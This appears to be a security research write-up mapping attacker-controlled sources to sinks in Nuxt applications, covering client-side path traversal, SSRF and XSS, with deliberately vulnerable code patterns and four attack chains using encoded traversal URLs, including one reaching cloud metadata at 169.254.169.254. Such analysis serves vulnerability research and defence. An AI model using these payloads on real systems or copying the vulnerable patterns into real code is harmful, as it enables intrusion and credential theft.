# 02 - Source to Sink Analysis

## Sources (Where Attacker Input Enters)

### Client-Side Sources (Vue Router)

| Source | Type | Decoded? | Example |
|--------|------|----------|---------|
| `route.params.id` | Dynamic param | Yes (decodeURIComponent) | `/users/..%2F..%2Fadmin` -> `../../admin` |
| `route.params.slug` | Catch-all (array) | Yes (each segment) | `/files/..%2Fetc/passwd` -> `['..', 'etc', 'passwd']` |
| `route.query.widget` | Query param | Partial (decoded, + not converted) | `?widget=..%2Fadmin` -> `../admin` |
| `route.path` | Full path | No (preserves encoding) | `/users/..%2F..%2Fadmin` stays encoded |
| `route.fullPath` | Full path + query + hash | No (preserves encoding) | Stays encoded |
| `route.hash` | Hash fragment | Yes (decoded) | `#..%2Fadmin` -> `../admin` |
| `window.location.pathname` | Raw browser path | Browser-dependent | Usually encoded |

### Server-Side Sources (H3/Nitro)

| Source | Type | Decoded? | Example |
|--------|------|----------|---------|
| `getRouterParam(event, 'id')` | Named param | **No** (by default) | Stays as received |
| `getRouterParam(event, 'id', { decode: true })` | Named param | Yes | `decodeURIComponent` applied |
| `event.context.params?.id` | Named param (raw) | **No** | Direct from radix3 match |
| `event.context.params?.path` | Catch-all | **No** | Path string as matched |
| `event.context.params?._` | Unnamed catch-all | **No** | Rest of path |
| `getQuery(event)` | Query params | Yes (by ufo) | Decoded query values |

### Stored Sources (Payload)

| Source | Type | Decoded? | Example |
|--------|------|----------|---------|
| Island payload `key` | Serialized in `__NUXT__` | N/A | Stored value, not URL-encoded |
| `nuxtApp.payload.data[key]` | Hydration data | N/A | Whatever was serialized by server |

## Sinks (Where Attacker Input Is Consumed)

### Primary CSPT Sinks

#### 1. `useFetch()` with Template Literals

```javascript
// pages/users/[id].vue
const route = useRoute()
const { data } = useFetch(`/api/users/${route.params.id}`)
// route.params.id is DECODED -> "../../admin" flows as literal path traversal
```

**Source file:** `nuxt/dist/app/composables/fetch.js:64`
```javascript
return _$fetch(_request.value, { signal, ..._fetchOptions });
// _request.value is the URL string -- NO sanitization
```

#### 2. `$fetch()` with String Concatenation

```javascript
// pages/shop/[category]/[productId].vue
$fetch("/api/shop/" + route.params.category + "/products/" + route.params.productId)
// Both params decoded -- double traversal opportunity
```

#### 3. Catch-All Array Join

```javascript
// pages/files/[...slug].vue
const slugPath = route.params.slug.join('/')
useFetch(`/api/files/${slugPath}`)
// Array of decoded segments joined back -- traversal preserved
```

#### 4. `v-html` with API Response

```javascript
// pages/dashboard/stats.vue
const { data: widgetHtml } = useFetch(`/api/widgets/${widgetType.value}`)
// Template: <div v-html="widgetHtml" />
// If CSPT redirects fetch to attacker-controlled JSON -> XSS
```

**Production build confirms the sink** (`.output/public/_nuxt/DCUYqxw9.js`):
```javascript
const c=["innerHTML"]
// ...
t("div",{innerHTML:a(n)},null,8,c)
```

#### 5. API Service Composable

```javascript
// composables/useApiService.ts
export const useApiService = () => ({
  get: (path: string) => $fetch(`/api${path}`)
})
// Any user-controlled path flows directly to $fetch
```

#### 6. Island Payload Revival (CVE-2025-59414)

```javascript
// nuxt/dist/app/plugins/revive-payload.client.js:20
nuxtApp.payload.data[key] ||= $fetch(`/__nuxt_island/${key}.json`, {
  responseType: "json",
  ...params ? { params } : {}
})
```

The `key` is deserialized from `window.__NUXT__` payload. If the payload is poisoned (via cache poisoning, stored injection, or MITM), the key can traverse the `$fetch` URL.

#### 7. `NuxtIsland` Component Fetch

```javascript
// nuxt/dist/app/components/nuxt-island.js:189
const url = `/__nuxt_island/${key2}.json`
const r = await eventFetch(withQuery(url, { ...props.context }))
```

The `key2` is constructed from `${props.name}_${hashId.value}`. While `hashId` is a hash, `props.name` comes from the component definition and `props.context` includes route data.

### Server-Side SSRF Sinks

#### 8. Proxy Pattern

```typescript
// server/api/proxy/[...path].ts
const path = event.context.params?.path || ''
return $fetch(`https://backend.internal/${path}`)
// Server-side: can reach internal services, cloud metadata, etc.
```

#### 9. Internal Service Fetch

```typescript
// server/api/users/[id].ts
const id = getRouterParam(event, 'id')
const res = await $fetch(`http://internal-service.local/users/${id}`)
// Even without decode, certain encoded sequences may bypass path restrictions
```

## Source-to-Sink Flow Diagram

```
[Browser URL Bar]
       |
       v
[Vue Router] --decode()--> [route.params.*]  (DECODED)
       |                          |
       |                          v
       |                   [useFetch(`/api/${param}`)]  --> CSPT
       |                   [$fetch(`/api/${param}`)]    --> CSPT
       |
       +--preserves--> [route.path]  (ENCODED)
       |                    |
       |                    v
       |              [Safe if used directly, dangerous if decoded again]
       |
[H3 Server] --raw--> [event.context.params]  (NOT decoded by default)
       |                    |
       |                    v
       |              [$fetch(`http://internal/${param}`)]  --> SSRF
       |
[Payload] --deserialize--> [key from __NUXT__]
                                |
                                v
                          [$fetch(`/__nuxt_island/${key}.json`)]  --> Stored CSPT
```

## Critical Chains

### Chain 1: CSPT + v-html = XSS

```
URL: /dashboard/stats?widget=../../attacker-controlled-endpoint
  -> route.query.widget = "../../attacker-controlled-endpoint"
  -> useFetch("/api/widgets/../../attacker-controlled-endpoint")
  -> Fetch redirected to attacker endpoint returning HTML
  -> v-html renders the response
  -> XSS
```

### Chain 2: Server Route SSRF

```
URL: /api/proxy/..%2F..%2F..%2Fmetadata/v1/instance
  -> event.context.params.path = "../../../metadata/v1/instance" (if decoded)
  -> $fetch("https://backend.internal/../../../metadata/v1/instance")
  -> Cloud metadata access (169.254.169.254)
```

### Chain 3: Stored CSPT via Island Payload

```
1. Attacker poisons cache or injects into __NUXT__ payload
2. Sets island key to "../../api/attacker-endpoint"
3. Client revives payload:
   $fetch("/__nuxt_island/../../api/attacker-endpoint.json")
4. Traverses to arbitrary same-origin API endpoint
```

### Chain 4: Multi-Param Double Traversal

```
URL: /shop/..%2F..%2Fadmin/..%2Fusers
  -> route.params.category = "../../admin"
  -> route.params.productId = "../users"
  -> $fetch("/api/shop/../../admin/products/../users")
  -> Resolves to /api/admin/users
```
